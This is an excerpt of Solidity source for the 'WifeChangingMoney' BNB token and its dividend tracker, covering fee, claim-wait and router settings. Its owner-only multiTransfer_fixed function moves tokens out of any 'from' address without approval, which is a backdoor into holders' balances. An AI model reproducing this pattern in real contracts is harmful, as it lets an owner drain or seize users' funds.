...
contract WCMBNBDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("WCMBNB_Dividend_Tracker", "WCMBNB_Dividend_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 500000 * (10**9); // 0.05% 
    }

    function _transfer(address, address, uint256) internal override pure {
        require(false, "WCMBNB_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public override  pure {
        require(false, "WCMBNB_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main WCMBNB contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "WCMBNB_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "WCMBNB_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }

    function updateMinimumTokenBalanceForDividends(uint256 newBalance) external onlyOwner {
...
contract WifeChangingMoney is ERC20, Ownable {
    using SafeMath for uint256;

    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    WCMBNBDividendTracker public dividendTracker;

    address public _marketingWallet = 0x7377b619ef90Ea795E11f0398827383447994F52;
    address public _devWallet = 0x1d3F64A5Ab5e886C09679D74e0434d4516a2f990;
    ...
    constructor() ERC20("WifeChangingMoney", "WCM") {

        dividendTracker = new WCMBNBDividendTracker();
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "WCMBNB: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "WCMBNB: Account is already the value of 'excluded'");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "WCMBNB: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "WCMBNB: Cannot update gasForProcessing to same value");
    ...
    function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {
        ...
        for(uint i=0; i < addresses.length; i++){
            super._transfer(from, addresses[i],tokens * (10**9));
